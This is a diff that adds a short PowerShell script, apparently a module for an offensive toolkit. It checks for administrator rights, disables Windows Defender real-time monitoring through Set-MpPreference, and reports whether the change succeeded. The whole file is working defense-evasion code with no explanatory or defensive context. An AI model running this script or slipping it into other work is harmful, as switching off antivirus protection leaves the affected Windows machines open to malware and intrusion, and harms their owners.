@@ -1,0 +1,62 @@
+
+
+
+
+
+
+
+function invoke-disableDefender{
+    
+    
+
+    $good = $false
+    $results = ""
+
+    
+
+    $results = disable-realtime
+    if($results.Contains("successfully")){
+        $good = $true
+    }
+
+    
+
+    return @{results = $results; success = $good }
+}
+
+function disable-realtime {
+    
+    $isAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+    
+
+    if ($isAdmin){
+            
+
+            Set-MpPreference -DisableRealtimeMonitoring $true
+            defenderStatus
+    }else { return "Admin privileges required"}
+}
+
+function defenderStatus {
+    
+    
+
+    $outp = Get-MpPreference | Format-List DisableRealtimeMonitoring | out-string
+    if ($outp.Contains("True")) {
+        return "Defender RealTime Protection has been disabled successfully"
+    } else { return "Defender RealTime Protection couldn´t been disabled" }
+}
+
+
+
+
+
+
+
+
+
+$execute = invoke-disableDefender
+return @{results = $execute.results; success = $execute.success; }
+
+
+
